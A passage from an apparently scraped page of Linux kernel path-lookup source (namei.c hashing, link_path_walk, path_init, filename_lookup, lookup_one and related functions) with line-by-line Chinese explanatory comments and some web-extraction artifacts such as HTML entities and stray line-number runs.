^= (a), \\ y ^= x, x = rol32(x, 7),\\ x += y, y = rol32(y,20),\\ y *= 9 )/* * 定义了一个名为 HASH_MIX 的宏，它接受三个参数：x，y和a。 * 宏的主体是一个表达式序列，其中包括几个位操作和算术操作， * 这些操作可以混合和扩散输入值的比特，以改善哈希函数的性能。 */static inline unsigned int fold_hash(unsigned long x, unsigned long y)&#123; /* Use arch-optimized multiply if one exists */ return __hash_32(y ^ __hash_32(x));&#125;/* * 定义了一个名为 fold_hash 的内联函数，它接受两个 unsigned long 参数：x 和 y。 * 函数首先执行 XOR 操作，然后调用 __hash_32 函数将结果折叠为一个32位的哈希值。 * 这个函数也考虑了系统架构的优化，如果存在针对特定架构优化的乘法操作，它会使用。 */#endif/* * &#x27;#endif&#x27; 是预处理器指令的结束标志，表示前面的条件编译块结束。 */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123/* * 返回已知长度字符串的哈希值。这个函数被精心设计来匹配 hash_name() 函数，后者是更重要的函数。 * 特别是，我们必须通过哈希一个最终的包含0..7个有效字节的词来结束， * 以匹配 hash_name() 函数迭代直到找到名字后的分隔符的方式。 */unsigned int full_name_hash(const void *salt, const char *name, unsigned int len)&#123; unsigned long a, x = 0, y = (unsigned long)salt; for (;;) &#123; if (!len) goto done; // 如果长度为0，直接跳到done a = load_unaligned_zeropad(name); // 从name加载一个未对齐的值，并补0 if (len &lt; sizeof(unsigned long)) break; // 如果长度小于unsigned long的字节长度，跳出循环 HASH_MIX(x, y, a); // 执行哈希混合操作 name += sizeof(unsigned long); // 移动name的指针 len -= sizeof(unsigned long); // 减少len的值 &#125; x ^= a &amp; bytemask_from_count(len); // 执行XOR操作done: return fold_hash(x, y); // 返回折叠后的哈希值&#125;EXPORT_SYMBOL(full_name_hash); // 导出full_name_hash符号/* 返回一个以空字符结束的字符串的&quot;hash_len&quot;（哈希值和长度） */u64 hashlen_string(const void *salt, const char *name)&#123; unsigned long a = 0, x = 0, y = (unsigned long)salt; unsigned long adata, mask, len; const struct word_at_a_time constants = WORD_AT_A_TIME_CONSTANTS; len = 0; goto inside; // 直接跳到inside标签 do &#123; HASH_MIX(x, y, a); // 执行哈希混合操作 len += sizeof(unsigned long); // 增加len的值inside: a = load_unaligned_zeropad(name+len); // 从name+len加载一个未对齐的值，并补0 &#125; while (!has_zero(a, &amp;adata, &amp;constants)); // 循环直到a中有0 adata = prep_zero_mask(a, adata, &amp;constants); // 准备零掩码 mask = create_zero_mask(adata); // 创建零掩码 x ^= a &amp; zero_bytemask(mask); // 执行XOR操作 return hashlen_create(fold_hash(x, y), len + find_zero(mask)); // 创建hashlen&#125;EXPORT_SYMBOL(hashlen_string); // 导出hashlen_string符号/* * 计算路径组件的长度和哈希值，并返回&quot;hash_len&quot;作为结果。 */static inline u64 hash_name(const void *salt, const char *name)&#123; unsigned long a = 0, b, x = 0, y = (unsigned long)salt; unsigned long adata, bdata, mask, len; const struct word_at_a_time constants = WORD_AT_A_TIME_CONSTANTS; len = 0; goto inside; // 直接跳到inside标签 do &#123; HASH_MIX(x, y, a); // 执行哈希混合操作 len += sizeof(unsigned long); // 增加len的值inside: a = load_unaligned_zeropad(name+len); // 从name+len加载一个未对齐的值，并补0 b = a ^ REPEAT_BYTE(&#x27;/&#x27;); // 执行XOR操作 &#125; while (!(has_zero(a, &amp;adata, &amp;constants) | has_zero(b, &amp;bdata, &amp;constants))); // 循环直到a或b中有0 adata = prep_zero_mask(a, adata, &amp;constants); // 准备零掩码 bdata = prep_zero_mask(b, bdata, &amp;constants); // 准备零掩码 mask = create_zero_mask(adata | bdata); // 创建零掩码 x ^= a &amp; zero_bytemask(mask); // 执行XOR操作 return hashlen_create(fold_hash(x, y), len + find_zero(mask)); // 创建hash```c#else /* !CONFIG_DCACHE_WORD_ACCESS: 慢速，逐字节版本 *//* 返回已知长度字符串的哈希值 */unsigned int full_name_hash(const void *salt, const char *name, unsigned int len)&#123; unsigned long hash = init_name_hash(salt); // 初始化名字哈希值 while (len--) hash = partial_name_hash((unsigned char)*name++, hash); // 对每一个字节进行哈希 return end_name_hash(hash); // 结束名字哈希&#125;EXPORT_SYMBOL(full_name_hash); // 导出full_name_hash符号/* 返回一个以空字符结束的字符串的&quot;hash_len&quot;（哈希值和长度） */u64 hashlen_string(const void *salt, const char *name)&#123; unsigned long hash = init_name_hash(salt); // 初始化名字哈希值 unsigned long len = 0, c; c = (unsigned char)*name; while (c) &#123; len++; hash = partial_name_hash(c, hash); // 对每一个字节进行哈希 c = (unsigned char)name[len]; &#125; return hashlen_create(end_name_hash(hash), len); // 创建hashlen&#125;EXPORT_SYMBOL(hashlen_string); // 导出hashlen_string符号/* * 我们知道这里至少有一个真实的路径组件。 */static inline u64 hash_name(const void *salt, const char *name)&#123; unsigned long hash = init_name_hash(salt); // 初始化名字哈希值 unsigned long len = 0, c; c = (unsigned char)*name; do &#123; len++; hash = partial_name_hash(c, hash); // 对每一个字节进行哈希 c = (unsigned char)name[len]; &#125; while (c &amp;&amp; c != &#x27;/&#x27;); // 循环直到遇到空字符或者&#x27;/&#x27; return hashlen_create(end_name_hash(hash), len); // 创建hashlen&#125;#endif 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123static int link_path_walk(const char *name, struct nameidata *nd)&#123; int depth = 0; // 初始化深度为 0，用于记录符号链接的嵌套层数 int err; // 初始化 nd-&gt;last_type 和 nd-&gt;flags nd-&gt;last_type = LAST_ROOT; // 设置 nd-&gt;last_type 为 LAST_ROOT nd-&gt;flags |= LOOKUP_PARENT; // 更新 nd-&gt;flags，添加 LOOKUP_PARENT 标志 // 如果路径名是错误的，返回错误值 if (IS_ERR(name)) // 检查路径名是否有效（不是错误指针） return PTR_ERR(name); // 如果无效，返回错误值 // 跳过路径名开头的 &#x27;/&#x27; while (*name == &#x27;/&#x27;) // 当路径名以 &#x27;/&#x27; 开头时，进入循环 name++; // 将 name 指针向后移动一位，跳过 &#x27;/&#x27; // 如果路径名为空，返回 0 if (!*name) &#123; // 检查路径名是否为空（在跳过开头的 &#x27;/&#x27; 之后） nd-&gt;dir_mode = 0; // 将 nd-&gt;dir_mode 设置为 0 return 0; // 返回 0，表示路径查找结束 &#125; // 开始循环处理路径名的每个组件 for (;;) &#123; // 无限循环，直到路径名的所有组件都被处理 struct mnt_idmap *idmap; const char *link; u64 hash_len; int type; // 获取文件系统 ID 映射,文件系统 ID 映射用于将 VFS 中的用户和组 ID 转换为底层文件系统中的用户和组 ID。 idmap = mnt_idmap(nd-&gt;path.mnt); // 获取 nd-&gt;path.mnt 对应的文件系统 ID 映射 // 检查是否有权限执行查找操作 err = may_lookup(idmap, nd); // 检查当前用户是否有权限查找 if (err) // 如果没有权限 return err; // 返回错误值 // 计算当前路径组件的哈希值和长度,这些值将用于在散列查找中快速比较路径名组件。 hash_len = hash_name(nd-&gt;path.dentry, name); // 计算哈希值和长度 // 判断当前路径组件的类型（&#x27;.&#x27;、&#x27;..&#x27; 或普通组件） type = LAST_NORM; // 默认为普通组件 if (name[0] == &#x27;.&#x27;) switch (hashlen_len(hash_len)) &#123; // 如果组件以 &#x27;.&#x27; 开头，检查长度 case 2: if (name[1] == &#x27;.&#x27;) &#123; // 如果组件为 &quot;..&quot; type = LAST_DOTDOT; // 设置类型为 LAST_DOTDOT nd-&gt;state |= ND_JUMPED; // 更新 nd-&gt;state，添。这个标志表示我们正跳转到父目录。 &#125; break; case 1: type = LAST_DOT; // 如果组件为 &quot;.&quot;，设置类型为 LAST_DOT &#125; if (likely(type == LAST_NORM)) &#123; // 如果组件类型为普通组件 struct dentry *parent = nd-&gt;path.dentry; // 获取当前组件的父目录 nd-&gt;state &amp;= ~ND_JUMPED; // 清除 nd-&gt;state 的 ND_JUMPED 标志 // 如果需要，执行自定义哈希操作。某些文件系统可能需要自定义哈希操作以适应其特定的查找机制。 if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_HASH)) &#123; // 检查父目录是否需要自定义哈希操作 struct qstr this = &#123; &#123; .hash_len = hash_len &#125;, .name = name &#125;; // 初始化 qstr 结构体 err = parent-&gt;d_op-&gt;d_hash(parent, &amp;this); // 执行自定义哈希操作 if (err &lt; 0) // 如果操作失败 return err; // 返回错误值 hash_len = this.hash_len; // 更新哈希值和长度 name = this.name; // 更新 name 指针 &#125; &#125; //--------------------------------------------------------------------- // 更新 nd 的 last 和 last_type 成员 nd-&gt;last.hash_len = hash_len; // 设置 nd-&gt;last 的哈希值和长度 nd-&gt;last.name = name; // 设置 nd-&gt;last 的名称 nd-&gt;last_type = type; // 设置 nd-&gt;last_type 为当前组件的类型 // 将 name 指针向后移动到下一个路径组件 name += hashlen_len(hash_len); // 将 name 指针向后移动到下一个路径组件的起始位置 // 如果到达路径名的结尾，处理结束 if (!*name) // 检查是否到达路径名的结尾 goto OK; // 跳转到 OK 标签 // 跳过连续的 &#x27;/&#x27; do &#123; name++; // 将 name 指针向后移动一位 &#125; while (unlikely(*name == &#x27;/&#x27;)); // 当遇到 &#x27;/&#x27; 时，继续循环 // 如果到达路径名的结尾，处理结束 if (unlikely(!*name)) &#123; // 再次检查是否到达路径名的结尾OK: // pathname or trailing symlink, done if (!depth) &#123; // 如果当前处理的路径组件不是符号链接的一部分 nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); // 设置 nd-&gt;dir_vfsuid nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; // 设置 nd-&gt;dir_mode nd-&gt;flags &amp;= ~LOOKUP_PARENT; // 清除 nd-&gt;flags 的 LOOKUP_PARENT 标志 return 0; // 返回 0，表示路径查找结束 &#125; // last component of nested symlink name = nd-&gt;stack[--depth].name; // 获取符号链接栈中下一个组件的名称 link = walk_component(nd, 0); // 处理当前组件 &#125; else &#123; // not the last component link = walk_component(nd, WALK_MORE); // 处理当前组件，传递 WALK_MORE 标志 &#125; // 如果 link 不为空，表示需要处理符号链接 if (unlikely(link)) &#123; // 检查 link 是否为空 if (IS_ERR(link)) // 如果 link 是错误指针 return PTR_ERR(link); // 返回错误值 // a symlink to follow nd-&gt;stack[depth++].name = name; // 将当前组件的名称压入符号链接栈 name = link; // 将 name 指针设置为符号链接的目标路径 continue; // 继续循环处理符号链接的目标路径 &#125; // 检查 dentry 是否可以执行查找操作 if (unlikely(!d_can_lookup(nd-&gt;path.dentry))) &#123; // 如果不能执行查找操作 if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果 nd-&gt;flags 中包含 LOOKUP_RCU 标志 if (!try_to_unlazy(nd)) // 尝试取消对 nd 的懒加载 return -ECHILD; // 如果取消失败，返回 -ECHILD 错误值 &#125; return -ENOTDIR; // 返回 -ENOTDIR 错误值，表示不是目录 &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106/* * 此函数初始化路径查找。返回的字符串指针是路径名的剩余部分。 */static const char *path_init(struct nameidata *nd, unsigned flags)&#123; int error; const char *s = nd-&gt;name-&gt;name; // 获取路径名 /* 如果只设置了 LOOKUP_CACHED 而未设置 LOOKUP_RCU，则要求调用方重试 */ if ((flags &amp; (LOOKUP_RCU | LOOKUP_CACHED)) == LOOKUP_CACHED) return ERR_PTR(-EAGAIN); if (!*s) // 如果路径名为空，则关闭 LOOKUP_RCU flags &amp;= ~LOOKUP_RCU; if (flags &amp; LOOKUP_RCU) // 如果设置了 LOOKUP_RCU，则进行 RCU 读锁定 rcu_read_lock(); else nd-&gt;seq = nd-&gt;next_seq = 0; nd-&gt;flags = flags; // 设置标志位 nd-&gt;state |= ND_JUMPED; // 设置状态为已跳转 // 开始读取挂载锁和重命名锁的序列计数 nd-&gt;m_seq = __read_seqcount_begin(&amp;mount_lock.seqcount); nd-&gt;r_seq = __read_seqcount_begin(&amp;rename_lock.seqcount); smp_rmb(); if (nd-&gt;state &amp; ND_ROOT_PRESET) &#123; // 如果设置了 ND_ROOT_PRESET struct dentry *root = nd-&gt;root.dentry; // 获取根目录项 struct inode *inode = root-&gt;d_inode; // 获取根目录项的索引节点 if (*s &amp;&amp; unlikely(!d_can_lookup(root))) // 如果路径名不为空且根目录项无法查找，则返回错误 return ERR_PTR(-ENOTDIR); nd-&gt;path = nd-&gt;root; // 设置路径为根路径 nd-&gt;inode = inode; // 设置索引节点 if (flags &amp; LOOKUP_RCU) &#123; // 如果设置了 LOOKUP_RCU nd-&gt;seq = read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); // 开始读取路径的目录项的序列计数 nd-&gt;root_seq = nd-&gt;seq; // 设置根序列计数 &#125; else &#123; path_get(&amp;nd-&gt;path); // 获取路径 &#125; return s; // 返回路径名的剩余部分 &#125; nd-&gt;root.mnt = NULL; /* 如果是绝对路径名，则获取根目录 */ if (*s == &#x27;/&#x27; &amp;&amp; !(flags &amp; LOOKUP_IN_ROOT)) &#123; error = nd_jump_root(nd); // 跳转到根目录 if (unlikely(error)) // 如果返回错误，则返回错误 return ERR_PTR(error); return s; // 返回路径名的剩余部分 &#125; /* 如果是相对路径名，则获取它相对的起始点 */ if (nd-&gt;dfd == AT_FDCWD) &#123; if (flags &amp; LOOKUP_RCU) &#123; // 如果设置了 LOOKUP_RCU struct fs_struct *fs = current-&gt;fs; unsigned seq; do &#123; seq = read_seqcount_begin(&amp;fs-&gt;seq); // 开始读取文件系统的序列计数 nd-&gt;path = fs-&gt;pwd; // 设置路径为当前工作目录 nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; // 设置索引节点 nd-&gt;seq = __read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); // 开始读取路径的目录项的序列计数 &#125; while (read_seqcount_retry(&amp;fs-&gt;seq, seq)); // 如果文件系统的序列计数有变，则重试 &#125; else &#123; get_fs_pwd(current-&gt;fs, &amp;nd-&gt;path); // 获取当前工作目录 nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; // 设置索引节点 &#125; &#125; else &#123; /* 调用方必须检查起始路径组件的执行权限 */ struct fd f = fdget_raw(nd-&gt;dfd); // 获取文件描述符 struct dentry *dentry; if (!f.file) // 如果文件不存在，则返回错误 return ERR_PTR(-EBADF); dentry = f.file-&gt;f_path.dentry; // 获取文件的目录```c if (*s &amp;&amp; unlikely(!d_can_lookup(dentry))) &#123; // 如果路径名不为空且目录项无法查找，则返回错误 fdput(f); // 释放文件描述符 return ERR_PTR(-ENOTDIR); &#125; nd-&gt;path = f.file-&gt;f_path; // 设置路径为文件的路径 if (flags &amp; LOOKUP_RCU) &#123; // 如果设置了 LOOKUP_RCU nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; // 设置索引节点 nd-&gt;seq = read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); // 开始读取路径的目录项的序列计数 &#125; else &#123; path_get(&amp;nd-&gt;path); // 获取路径 nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; // 设置索引节点 &#125; fdput(f); // 释放文件描述符 &#125; /* 对于限定范围的查找，我们需要将根设置为 dirfd */ if (flags &amp; LOOKUP_IS_SCOPED) &#123; nd-&gt;root = nd-&gt;path; // 设置根为路径 if (flags &amp; LOOKUP_RCU) &#123; // 如果设置了 LOOKUP_RCU nd-&gt;root_seq = nd-&gt;seq; // 设置根序列计数 &#125; else &#123; path_get(&amp;nd-&gt;root); // 获取根路径 nd-&gt;state |= ND_ROOT_GRABBED; // 设置状态为已获取根 &#125; &#125; return s; // 返回路径名的剩余部分&#125; 12345678/* 这个函数负责查找路径的最后一个组件，如果最后一个组件是普通类型且后面还有字符，则设置查找标志为 FOLLOW 和 DIRECTORY，并走向下一个组件 */static inline const char *lookup_last(struct nameidata *nd)&#123; if (nd-&gt;last_type == LAST_NORM &amp;&amp; nd-&gt;last.name[nd-&gt;last.len]) nd-&gt;flags |= LOOKUP_FOLLOW | LOOKUP_DIRECTORY; return walk_component(nd, WALK_TRAILING);&#125; 12345678/* 这个函数处理路径下降的情况，如果不在 RCU 模式下，则获取目录项的引用，然后进入下一步 */static int handle_lookup_down(struct nameidata *nd)&#123; if (!(nd-&gt;flags &amp; LOOKUP_RCU)) dget(nd-&gt;path.dentry); nd-&gt;next_seq = nd-&gt;seq; return PTR_ERR(step_into(nd, WALK_NOFOLLOW, nd-&gt;path.dentry));&#125; 123456789101112131415161718192021222324252627282930313233343536/* 这个函数进行路径查找，初始化路径后，如果设置了 LOOKUP_DOWN，则处理路径下降的情况，然后进行链接路径的遍历，完成路径的遍历后，检查是否设置了 LOOKUP_MOUNTPOINT，如果是，则再次处理路径下降的情况，最后如果设置了 LOOKUP_DIRECTORY，则检查是否可以进行目录查找，如果不能则返回错误，否则设置路径并终止路径遍历 */static int path_lookupat(struct nameidata *nd, unsigned flags, struct path *path)&#123; const char *s = path_init(nd, flags); // 初始化路径 int err; if (unlikely(flags &amp; LOOKUP_DOWN) &amp;&amp; !IS_ERR(s)) &#123; // 如果设置了 LOOKUP_DOWN，则处理路径下降的情况 err = handle_lookup_down(nd); if (unlikely(err &lt; 0)) s = ERR_PTR(err); &#125; while (!(err = link_path_walk(s, nd)) &amp;&amp; // 遍历链接路径 (s = lookup_last(nd)) != NULL) // 查找路径的最后一个组件 ; if (!err &amp;&amp; unlikely(nd-&gt;flags &amp; LOOKUP_MOUNTPOINT)) &#123; // 如果没有错误且设置了 LOOKUP_MOUNTPOINT，则处理路径下降的情况 err = handle_lookup_down(nd); nd-&gt;state &amp;= ~ND_JUMPED; // no d_weak_revalidate(), please... &#125; if (!err) // 如果没有错误，则完成路径遍历 err = complete_walk(nd); if (!err &amp;&amp; nd-&gt;flags &amp; LOOKUP_DIRECTORY) // 如果没有错误且设置了 LOOKUP_DIRECTORY，则检查是否可以进行目录查找 if (!d_can_lookup(nd-&gt;path.dentry)) err = -ENOTDIR; if (!err) &#123; // 如果没有错误，则设置路径 *path = nd-&gt;path; nd-&gt;path.mnt = NULL; nd-&gt;path.dentry = NULL; &#125; terminate_walk(nd); // 终止路径遍历 return err;&#125; 123456789101112131415161718192021/* 这个函数负责查找文件名对应的路径，首先设置名称数据，然后进行路径查找。如果返回值是 -ECHILD 或者 -ESTALE，就会再次进行路径查找，最后如果没有错误，就会审计节点并恢复名称数据 */int filename_lookup(int dfd, struct filename *name, unsigned flags, struct path *path, struct path *root)&#123; int retval; struct nameidata nd; if (IS_ERR(name)) // 如果文件名出错，返回错误 return PTR_ERR(name); set_nameidata(&amp;nd, dfd, name, root); // 设置名称数据 retval = path_lookupat(&amp;nd, flags | LOOKUP_RCU, path); // 进行路径查找 if (unlikely(retval == -ECHILD)) // 如果返回值是 -ECHILD，再次进行路径查找 retval = path_lookupat(&amp;nd, flags, path); if (unlikely(retval == -ESTALE)) // 如果返回值是 -ESTALE，再次进行路径查找 retval = path_lookupat(&amp;nd, flags | LOOKUP_REVAL, path); if (likely(!retval)) // 如果没有错误，审计节点 audit_inode(name, path-&gt;dentry, flags &amp; LOOKUP_MOUNTPOINT ? AUDIT_INODE_NOEVAL : 0); restore_nameidata(); // 恢复名称数据 return retval;&#125; 12345678910111213141516/* 这个函数负责获取路径的父路径，首先初始化路径，然后进行链接路径遍历，最后完成路径遍历并设置父路径 */static int path_parentat(struct nameidata *nd, unsigned flags, struct path *parent)&#123; const char *s = path_init(nd, flags); // 初始化路径 int err = link_path_walk(s, nd); // 遍历链接路径 if (!err) // 如果没有错误，完成路径遍历 err = complete_walk(nd); if (!err) &#123; // 如果没有错误，设置父路径 *parent = nd-&gt;path; nd-&gt;path.mnt = NULL; nd-&gt;path.dentry = NULL; &#125; terminate_walk(nd); // 终止路径遍历 return err;&#125; 123456789101112131415161718192021222324/* 这个函数获取文件名的父路径，首先设置名称数据，然后获取父路径。如果返回值是 -ECHILD 或者 -ESTALE，就会再次获取父路径，最后如果没有错误，就会设置最后一个组件的名称和类型，并审计节点 */static int filename_parentat(int dfd, struct filename *name, unsigned int flags, struct path *parent, struct qstr *last, int *type)&#123; int retval; struct nameidata nd; if (IS_ERR(name)) // 如果文件名出错，返回错误 return PTR_ERR(name); set_nameidata(&amp;nd, dfd, name, NULL); // 设置名称数据 retval = path_parentat(&amp;nd, flags | LOOKUP_RCU, parent); // 获取父路径 if (unlikely(retval == -ECHILD)) // 如果返回值是 -ECHILD，再次获取父路径 retval = path_parentat(&amp;nd, flags, parent); if (unlikely(retval == -ESTALE)) // 如果返回值是 -ESTALE，再次获取父路径 retval = path_parentat(&amp;nd, flags | LOOKUP_REVAL, parent); if (likely(!retval)) &#123; // 如果没有错误，设置最后一个组件的名称和类型，并审计节点 *last = nd.last; *type = nd.last_type; audit_inode(name, parent-&gt;dentry, AUDIT_INODE_PARENT); &#125; restore_nameidata(); // 恢复名称数据 return retval;&#125; 12345678910111213141516171819202122/* 这个函数首先获取文件名的父路径，然后如果类型不是 LAST_NORM，就会释放路径并返回错误。然后锁定父节点并进行查找。如果查找失败，就会解锁并释放路径。 */static struct dentry *__kern_path_locked(struct filename *name, struct path *path)&#123; struct dentry *d; struct qstr last; int type, error; error = filename_parentat(AT_FDCWD, name, 0, path, &amp;last, &amp;type); // 获取文件名的父路径 if (error) // 如果出错，返回错误 return ERR_PTR(error); if (unlikely(type != LAST_NORM)) &#123; // 如果类型不是 LAST_NORM，释放路径并返回错误 path_put(path); return ERR_PTR(-EINVAL); &#125; inode_lock_nested(path-&gt;dentry-&gt;d_inode, I_MUTEX_PARENT); // 锁定父节点 d = __lookup_hash(&amp;last, path-&gt;dentry, 0); // 进行查找 if (IS_ERR(d)) &#123; // 如果查找失败，解锁并释放路径 inode_unlock(path-&gt;dentry-&gt;d_inode); path_put(path); &#125; return d;&#125; 123456789/* 这个函数获取文件名，并进行路径查找，最后释放文件名 */struct dentry *kern_path_locked(const char *name, struct path *path)&#123; struct filename *filename = getname_kernel(name); // 获取文件名 struct dentry *res = __kern_path_locked(filename, path); // 进行路径查找 putname(filename); // 释放文件名 return res;&#125; 1234567891011/* 这个函数获取文件名，并进行文件名查找，最后释放文件名 */int kern_path(const char *name, unsigned int flags, struct path *path)&#123; struct filename *filename = getname_kernel(name); // 获取文件名 int ret = filename_lookup(AT_FDCWD, filename, flags, path, NULL); // 进行文件名查找 putname(filename); // 释放文件名 return ret;&#125;EXPORT_SYMBOL(kern_path); 12345678910111213141516171819202122232425/** * vfs_path_lookup - lookup a file path relative to a dentry-vfsmount pair * @dentry: pointer to dentry of the base directory * @mnt: pointer to vfs mount of the base directory * @name: pointer to file name * @flags: lookup flags * @path: pointer to struct path to fill * * 这个函数首先获取文件名，然后进行文件名查找，最后释放文件名 */int vfs_path_lookup(struct dentry *dentry, struct vfsmount *mnt, const char *name, unsigned int flags, struct path *path)&#123; struct filename *filename; struct path root = &#123;.mnt = mnt, .dentry = dentry&#125;; // 设置根路径 int ret; filename = getname_kernel(name); // 获取文件名 /* the first argument of filename_lookup() is ignored with root */ ret = filename_lookup(AT_FDCWD, filename, flags, path, &amp;root); // 进行文件名查找 putname(filename); // 释放文件名 return ret;&#125;EXPORT_SYMBOL(vfs_path_lookup); 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* 定义一个函数 lookup_one_common，该函数用于在基础目录中查找指定名称的目录项。idmap: 用户和组的身份映射；name: 需要查找的目录项名称；base: 基础目录；len: 名称的长度；this: qstr（quick string）结构的指针，用于存储查找的结果。*/static int lookup_one_common(struct mnt_idmap *idmap, const char *name, struct dentry *base, int len, struct qstr *this)&#123; /* 初始化 this 结构 */ this-&gt;name = name; this-&gt;len = len; /* 计算并设置哈希值 */ this-&gt;hash = full_name_hash(base, name, len); /* 如果名称长度为0，返回错误 */ if (!len) return -EACCES; /* 如果名称以&#x27;.&#x27;开始，且长度小于2或者长度等于2且第二个字符也为&#x27;.&#x27;，返回错误 */ if (unlikely(name[0] == &#x27;.&#x27;)) &#123; if (len &lt; 2 || (len == 2 &amp;&amp; name[1] == &#x27;.&#x27;)) return -EACCES; &#125; /* 如果名称中包含&#x27;/&#x27;或者&#x27;\\0&#x27;，返回错误 */ while (len--) &#123; unsigned int c = *(const unsigned char *)name++; if (c == &#x27;/&#x27; || c == &#x27;\\0&#x27;) return -EACCES; &#125; /* 如果基础目录的标志位包含 DCACHE_OP_HASH，尝试使用底层文件系统的哈希函数 */ if (base-&gt;d_flags &amp; DCACHE_OP_HASH) &#123; int err = base-&gt;d_op-&gt;d_hash(base, this); if (err &lt; 0) return err; &#125; /* 检查权限 */ return inode_permission(idmap, base-&gt;d_inode, MAY_EXEC);&#125; 1234567891011121314151617181920212223242526/*定义一个函数 try_lookup_one_len，该函数用于在基础目录中查找并返回指定名称的目录项，如果该目录项不存在，则返回 NULL。name: 需要查找的目录项名称；base: 基础目录；len: 名称的长度。*/struct dentry *try_lookup_one_len(const char *name, struct dentry *base, int len)&#123; struct qstr this; int err; /* 检查基础目录的 inode 是否被锁定，如果没有被锁定，发出警告 */ WARN_ON_ONCE(!inode_is_locked(base-&gt;d_inode)); /* 调用 lookup_one_common 函数进行查找 */ err = lookup_one_common(&amp;nop_mnt_idmap, name, base, len, &amp;this); /* 如果查找过程中发生错误，返回一个包含错误码的指针 */ if (err) return ERR_PTR(err); /* 在 dcache 中查找并返回目录项 */ return lookup_dcache(&amp;this, base, 0);&#125;/* 导出 try_lookup_one_len 符号，使得其他模块可以使用这个函数 */EXPORT_SYMBOL(try_lookup_one_len); 12345678910111213141516171819202122232425262728293031/*定义一个函数 lookup_one_len，该函数用于在基础目录中查找并返回指定名称的目录项。如果在目录项缓存中找不到，则会调用__lookup_slow进行慢速查找。name: 需要查找的目录项名称；base: 基础目录；len: 名称的长度。注意：这个函数是文件系统的帮助函数，不应被通用代码调用。调用者必须持有 base-&gt;i_mutex。*/struct dentry *lookup_one_len(const char *name, struct dentry *base, int len)&#123; struct dentry *dentry; struct qstr this; int err; /* 检查基础目录的 inode 是否被锁定，如果没有被锁定，发出警告 */ WARN_ON_ONCE(!inode_is_locked(base-&gt;d_inode)); /* 调用 lookup_one_common 函数进行查找 */ err = lookup_one_common(&amp;nop_mnt_idmap, name, base, len, &amp;this); /* 如果查找过程中发生错误，返回一个包含错误码的指针 */ if (err) return ERR_PTR(err); /* 在 dcache 中查找并返回目录项，如果找不到，则进行慢速查找 */ dentry = lookup_dcache(&amp;this, base, 0); return dentry ? dentry : __lookup_slow(&amp;this, base, 0);&#125;/* 导出 lookup_one_len 符号，使得其他模块可以使用这个函数 */EXPORT_SYMBOL(lookup_one_len); 1234567891011121314151617181920212223242526272829303132/*定义一个函数 lookup_one，该函数用于在基础目录中查找并返回指定名称的目录项。如果在目录项缓存中找不到，则会调用__lookup_slow进行慢速查找。idmap: 用户和组的身份映射；name: 需要查找的目录项名称；base: 基础目录；len: 名称的长度。注意：这个函数是文件系统的帮助函数，不应被通用代码调用。调用者必须持有 base-&gt;i_mutex。*/struct dentry *lookup_one(struct mnt_idmap *idmap, const char *name, struct dentry *base, int len)&#123; struct dentry *dentry; struct qstr this; int err; /* 检查基础目录的 inode 是否被锁定，如果没有被锁定，发出警告 */ WARN_ON_ONCE(!inode_is_locked(base-&gt;d_inode)); /* 调用 lookup_one_common 函数进行查找 */ err = lookup_one_common(idmap, name, base, len, &amp;this); /* 如果查找过程中发生错误，返回一个包含错误码的指针 */ if (err) return ERR_PTR(err); /* 在 dcache 中查找并返回目录项，如果找不到，则进行慢速查找 */ dentry = lookup_dcache(&amp;this, base, 0); return dentry ? dentry : __lookup_slow(&amp;this, base, 0);&#125;/* 导出 lookup_one 符号，使得其他模块可以使用这个函数 */EXPORT_SYMBOL(lookup_one); 123456789101112131415161718192021222324252627282930/** * lookup_one_unlocked - 文件系统助手函数，用于查找单个路径名组件 * @idmap: 执行查找的挂载点的idmap * @name: 要查找的路径名组件 * @base: 要从中查找的基础目录 * @len: 应解释为最大长度@len * * 注意，这个函数只是文件系统使用的助手，并不应由通用代码调用。 * * 与lookup_one_len不同，这个函数应在没有占用父目录i_mutex的情况下调用， * 并且如果需要，它会自己获取i_mutex。 */struct dentry *lookup_one_unlocked(struct mnt_idmap *idmap, const char *name, struct dentry *base, int len)&#123; struct qstr this; int err; struct dentry *ret; //定义返回值 err = lookup_one_common(idmap, name, base, len, &amp;this); //调用lookup_one_common函数查找 if (err) return ERR_PTR(err); //如果出错，返回错误指针 ret = lookup_dcache(&amp;this, base, 0); //在目录缓存中查找 if (!ret) ret = lookup_slow(&amp;this, base, 0); //如果在目录缓存中找不到，执行慢查询 return ret; //返回查找结果&#125;EXPORT_SYMBOL(lookup_one_unlocked); //导出符号，供其他模块调用 1234567891011121314151617181920212223242526272829/** * lookup_one_positive_unlocked - 文件系统助手函数，用于查找单个路径名组件 * @idmap: 执行查找的挂载点的idmap * @name: 要查找的路径名组件 * @base: 要从中查找的基础目录 * @len: 应解释为最大长度@len * * 如果找到的是负向项，此助手函数将返回ERR_PTR(-ENOENT)。助手返回已知的正向项或ERR_PTR()。这是大多数用户想要的。 * * 注意，固定的负向项可以在任何时候变成正向项，所以调用lookup_one_unlocked()的函数需要非常小心； * 固定的正向项&gt;d_inode是稳定的，所以这个函数避免了这样的问题。 * * 注意，这个函数只是文件系统使用的助手，并不应由通用代码调用。 * * 在调用这个助手函数时，不应该持有i_mutex。 */struct dentry *lookup_one_positive_unlocked(struct mnt_idmap *idmap, const char *name, struct dentry *base, int len)&#123; struct dentry *ret = lookup_one_unlocked(idmap, name, base, len); //调用lookup_one_unlocked函数查找 if (!IS_ERR(ret) &amp;&amp; 